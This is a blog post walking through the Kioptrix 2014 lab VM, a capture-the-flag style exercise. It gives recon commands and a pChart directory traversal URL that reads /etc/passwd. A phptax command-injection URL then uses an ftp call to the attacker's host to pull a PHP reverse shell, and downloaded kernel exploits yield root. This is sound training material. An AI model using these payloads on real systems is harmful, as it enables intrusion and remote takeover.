---
layout: post
title: "Kioptrix2014 (#5)"
date: 2016-07-07 14:27:35 -0500
comments: true
categories: [vulhub, kioptrix]
---


###Tools:

* netdiscover
* Nmap
* Nikto
* User Agent Switcher


 
###Vulnerability:

 * [phptax 0.8 - Remote Code Execution Vulnerability](https://www.exploit-db.com/exploits/21665/)
 * [pChart2.1.3 Directory Traversal Vulnerability](https://www.exploit-db.com/exploits/31173/)
 * [FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit](https://www.exploit-db.com/exploits/26368/)
 * [FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit](https://www.exploit-db.com/exploits/28718/)




<!--more-->
Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/kioptrix5/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.193 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.193 -p-`


{% img  /images/blog/vulhub/kioptrix5/Selection_002.png   [title manually exploit [alt text]] %}

port 80 and 8080 are opening

use nikto to scan

`nikto -h 192.168.79.193`

nothing cool.

Use firefox to check the page port 80


{% img  /images/blog/vulhub/kioptrix5/Selection_003.png   [title manually exploit [alt text]] %}

just simple It works

port 8080

{% img  /images/blog/vulhub/kioptrix5/Selection_004.png   [title manually exploit [alt text]] %}

got forbidden. Great :(

now go back to port 80 and check the source code

{% img  /images/blog/vulhub/kioptrix5/Selection_005.png   [title manually exploit [alt text]] %}

find pchart2.1.3. [pchart](http://www.pchart.net/). I googled pchart2.1.3, find exploits [pChart 2.1.3 - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/31173/). I will use directory traversal.

`http://192.168.79.193/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd`

{% img  /images/blog/vulhub/kioptrix5/Selection_006.png   [title manually exploit [alt text]] %}

got passwd file, this is good, but not godd enough because I cannot shadow file.

Since Nmap determinate the target OS is FreeBSD, the Apache configure file is /usr/local/etc/apache2x/httpd.conf`. [Apache HTTP Server](https://www.freebsd.org/doc/handbook/network-apache.html)

`192.168.79.193/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf`


Here I find:

{% img  /images/blog/vulhub/kioptrix5/Selection_007.png   [title manually exploit [alt text]] %}

The port 8080 only allow Mozilla/4.0 user-agent.  I use User Agent Switcher (firefox plugin) to change my user-agent to `Mozilla/4.0`, then visit 192.168.79.193:8080

{% img  /images/blog/vulhub/kioptrix5/Selection_008.png   [title manually exploit [alt text]] %}

now search phptax

`searchsploit phptax`


{% img  /images/blog/vulhub/kioptrix5/Selection_009.png   [title manually exploit [alt text]] %}

test upload php shell first:

`http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob; uname > test.txt&pdf=make`

`http://192.168.79.193:8080/phptax/test.txt`

{% img  /images/blog/vulhub/kioptrix5/Selection_010.png   [title manually exploit [alt text]] %}


Here I tired to wget the php shell from my http server didn't work. I also tried to write php shell to a php file driectly, also failed. Now I use ftp to upload my shell:

check if ftp is availabe:

`http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob;which ftp >test1.txt; &pdf=make`

{% img  /images/blog/vulhub/kioptrix5/Selection_011.png   [title manually exploit [alt text]] %}


php reverse shell:

`/usr/share/webshells/php/php-reverse-shell.php`

change the IP address:

{% img  /images/blog/vulhub/kioptrix5/Selection_012.png   [title manually exploit [alt text]] %}

upload the shell using ftp:

`http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob;ftp -4 -d -v ftp://bobftpusername:bobftppassword@192.168.79.173//reverse.php; &pdf=make`

set up nc listener

get the shell:

{% img  /images/blog/vulhub/kioptrix5/Selection_013.png   [title manually exploit [alt text]] %}

check the kernel version

{% img  /images/blog/vulhub/kioptrix5/Selection_014.png   [title manually exploit [alt text]] %}


Its FreeBSD 9.0-RELEASE, `searchsploit freebsd 9.0`

{% img  /images/blog/vulhub/kioptrix5/Selection_015.png   [title manually exploit [alt text]] %}

copy these two exploits to /ftphome/

download them to the target:

`ftp -4 -d -v ftp://bobftpusername:bobftppassward@192.168.79.173//26368.c`
`ftp -4 -d -v ftp://bobftpusername:bobftppassward@192.168.79.173//28718.c`


get the F***ing root:

{% img  /images/blog/vulhub/kioptrix5/Selection_017.png   [title manually exploit [alt text]] %}














